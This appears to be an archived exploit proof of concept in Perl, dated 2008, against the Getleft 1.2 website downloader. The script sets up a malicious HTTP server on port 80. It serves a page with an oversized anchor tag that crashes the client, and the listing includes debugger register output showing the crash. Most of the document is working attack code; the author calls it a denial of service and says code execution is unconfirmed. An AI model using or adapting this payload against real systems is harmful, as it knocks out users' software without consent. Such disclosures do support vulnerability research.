<html><head><title>Getleft 1.2 Remote Buffer Overflow Proof of Concept</title></head><pre>#!/usr/bin/perl
#
# Getleft v1.2.0.0 DoS PoC
# Author: Koshi
#
# Application: Getleft v1.2
# Publisher: Andres Garcia ( http://personal1.iddeo.es/andresgarci/getleft/english/index.html )
# Description: Website Downloader, for such things as offline browsing.
# Tested On: Windows XP SP2
#
# Module: Getleft.exe
# eax=00c5f170 ebx=00000000 ecx=00000000 edx=00000000 esi=00000000 edi=00c5f170
# eip=004863eb esp=0022d9b0 ebp=010b4870 iopl=0         nv up ei pl nz na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
#
# Getleft+0x863eb:
# 004863eb 8b06            mov     eax,dword ptr [esi]  ds:0023:00000000=????????
# 
# &lt;embed src=&gt;, &lt;img src=&gt;, &lt;script src=&gt;, &lt;body background=&gt;
# Plenty of other tags will work as well. I'm not so sure about
# code execution, I'll have to try a few other things.
#

use IO::Socket;

my $body = &quot;&lt;a href=\x22/abcd.jpg\x22&gt;&quot; .&quot;A&quot;x1950 .&quot;&lt;/a&gt;&quot;;
my $resp = &quot;&quot;.
	&quot;HTTP/1.1 200 OK\r\n&quot;.
	&quot;Server: Apache\r\n&quot;.
	&quot;Date: Mon, 22 Dec 2008 21:50:46 GMT\r\n&quot;.
	&quot;Content-Type: text/html\r\n&quot;.
	&quot;Accept-Ranges: bytes\r\n&quot;.
	&quot;Last-Modified: Mon, 22 Dec 2008 21:45:46 GMT\r\n&quot;.
	&quot;Content-Length: &quot; .length($body) .&quot;\r\n&quot;.
	&quot;Connection: close\r\n\r\n&quot;.
	&quot;$body\r\n&quot;;

for ($i = 2; $i &gt;= 1; $i--) {

my $sock = new IO::Socket::INET (LocalPort =&gt; '80',
				 Proto =&gt; 'tcp',
				 Listen =&gt; 1,
				 Reuse =&gt; 1, );

print &quot;Listening...\n&quot;;
my $new_sock = $sock-&gt;accept();
print &quot;Connected...\n&quot;;
my $sock_addr = recv($new_sock,$msg,190,0);
print &quot;Sending ...\n&quot;;
print $new_sock &quot;$resp&quot;;
print &quot;Sent!\n&quot;;
close($sock);
print &quot;Closed.\r\n\r\n&quot;;

}

# milw0rm.com [2008-12-23]</pre></html>